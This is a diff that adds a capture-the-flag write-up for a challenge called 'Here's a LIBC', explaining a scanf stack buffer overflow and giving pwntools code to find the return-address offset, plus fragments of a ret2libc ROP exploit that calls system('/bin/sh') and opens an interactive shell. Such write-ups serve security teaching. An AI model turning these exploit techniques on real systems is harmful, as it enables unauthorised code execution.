@@ -1,3 +1,30 @@
+## Writeup - Here's a LIBC
+
+Vulnerability:
+First, open up the vuln binary with Ghidra to see the decomplied C code. If you look at the `main` function there is a `while`-loop that calls a function `do_stuff`. Inside this function there is a variable of size 112 but it's contents are read through `scanf`. This is a buffer-overflow. The idea now is to write a more than 112 bytes as input and then some code so that we can run that code. That code will essentially pop a shell with `/bin/sh`.
+
+
+Exploit:
+We first try to find how many characters to fill before the malicious code.
+
+Script to find offset:
+```
+from pwn import *
+
+io = process("./vuln")
+print(io.recvregex(b'!')) # read until we get the prompt
+io.sendline(cyclic(500))
+io.wait()
+core = io.corefile
+rsp = core.rsp
+info("rsp = %#x", rsp)
+pattern = core.read(rsp, 4)
+rip_offset = cyclic_find(pattern)
+info("rip offset is %d", rip_offset)
+```
+
+Full exploit:
+```
 import sys
 
 from pwn import *
@@ -66,4 +93,5 @@ rop2 += p64(system) #call system with /bin/sh argument from rdi
 r.clean()
 r.sendline(rop2)
 r.interactive()
+```
 
